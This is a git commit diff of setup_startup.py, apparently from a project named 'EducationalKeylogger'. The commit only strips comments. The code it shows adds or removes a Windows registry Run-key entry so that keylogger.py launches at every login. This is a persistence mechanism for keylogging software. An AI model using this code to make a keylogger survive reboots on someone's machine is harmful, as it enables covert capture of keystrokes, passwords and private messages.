d14c882ad464b2263861774c7471971cd2a76e8f
Broker-exe <oliwierginfo@proton.me>
2025-05-14 16:09:23 +0200

    setup_startup.py

--- setup_startup.py
+++ setup_startup.py
@@ -5,17 +5,15 @@ import argparse
 from pathlib import Path
 
 def setup_windows_startup(enable=True):
-    """Setup auto-startup in Windows Registry"""
     app_name = "EducationalKeylogger"
     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     
     try:
-        # Get the absolute path of the script
         script_path = os.path.abspath("keylogger.py")
         python_exe = sys.executable
         startup_command = f'"{python_exe}" "{script_path}"'
         
-        # Open the registry key
+
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             key_path,
@@ -24,11 +22,9 @@ def setup_windows_startup(enable=True):
         )
         
         if enable:
-            # Add to startup
             winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, startup_command)
             print("[+] Added to startup successfully")
         else:
-            # Remove from startup
             try:
                 winreg.DeleteValue(key, app_name)
                 print("[-] Removed from startup successfully")
